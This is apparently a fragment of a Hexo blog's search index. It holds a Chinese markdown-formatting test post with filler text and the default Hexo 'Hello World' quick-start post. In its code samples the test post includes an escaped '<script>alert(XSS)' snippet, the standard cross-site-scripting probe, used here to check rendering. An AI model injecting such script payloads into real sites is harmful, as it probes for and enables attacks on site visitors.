        <content type="html"><![CDATA[<h1 id="标题一"><a href="#标题一" class="headerlink" title="标题一"></a>标题一</h1><p>欣赏这张图片</p><p><img src="https://img.shalom86012.eu.org/imgs/shouanren.webp" alt="img"></p><h2 id="标题二"><a href="#标题二" class="headerlink" title="标题二"></a>标题二</h2><blockquote><p>引用：</p><p>hello</p></blockquote><p>加粗：</p><p><strong>hello</strong></p><p>斜体：</p><p><em>hello</em></p><p>代码：</p><p><code>&lt;html&gt;</code></p><p><code>&lt;script&gt;alert(XSS)</code></p><p><code>&lt;/script&gt;</code></p><p><code>&lt;/html&gt;</code></p><p>有序列表：</p><ol><li>合理</li><li>微服务</li><li>是否</li></ol><p>无序列表：</p><ul><li>是否</li><li>收费</li><li>我国</li></ul><p>任务列表：</p><ul><li><input checked="" disabled="" type="checkbox"> 水电费</li><li><input disabled="" type="checkbox"> 违反</li><li><input checked="" disabled="" type="checkbox"> 微分</li></ul><hr><p>代码块：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;blog.shalom86012.eu.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="2-标题"><a href="#2-标题" class="headerlink" title="2 标题"></a>2 标题</h1><h2 id="2-1-标题"><a href="#2-1-标题" class="headerlink" title="2.1 标题"></a>2.1 标题</h2><h3 id="2-1-1-标题"><a href="#2-1-1-标题" class="headerlink" title="2.1.1 标题"></a>2.1.1 标题</h3><p>我试试试试试试问题地方哥特发大水发生嘎嘎仨人发放</p><h3 id="2-1-2-标题"><a href="#2-1-2-标题" class="headerlink" title="2.1.2 标题"></a>2.1.2 标题</h3><p>昂首发阿萨法啊虽然矮人阿尔发放二维</p><h2 id="2-2-标题"><a href="#2-2-标题" class="headerlink" title="2.2 标题"></a>2.2 标题</h2><p>结束了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/10/16/hello-world/"/>
      <url>/2024/10/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
